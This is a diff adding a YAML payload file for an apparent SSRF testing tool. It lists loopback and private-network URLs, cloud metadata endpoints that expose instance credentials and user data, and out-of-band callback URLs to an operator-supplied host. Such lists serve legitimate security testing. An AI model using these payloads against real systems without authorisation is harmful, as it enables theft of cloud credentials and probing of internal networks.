@@ -1,0 +1,28 @@
+# Server-Side Request Forgery (SSRF) Payloads
+# Edit this file to add or remove payloads without touching source code.
+# The {oob} placeholder is replaced with the --oob-host value at runtime.
+
+payloads:
+  internal:
+    - "http://127.0.0.1"
+    - "http://127.0.0.1:80"
+    - "http://127.0.0.1:8080"
+    - "http://127.0.0.1:443"
+    - "http://localhost"
+    - "http://[::1]"
+    - "http://0.0.0.0"
+    - "http://10.0.0.1"
+    - "http://192.168.1.1"
+    - "http://172.16.0.1"
+
+  cloud_metadata:
+    - "http://169.254.169.254/latest/meta-data/"
+    - "http://169.254.169.254/latest/user-data/"
+    - "http://metadata.google.internal/computeMetadata/v1/"
+    - "http://100.100.100.200/latest/meta-data/"
+
+  oob:
+    - "http://{oob}/ssrf-test"
+    - "https://{oob}/ssrf-test"
+    - "http://{oob}:53/ssrf-test"
+    - "dict://{oob}:1337/ssrf-test"
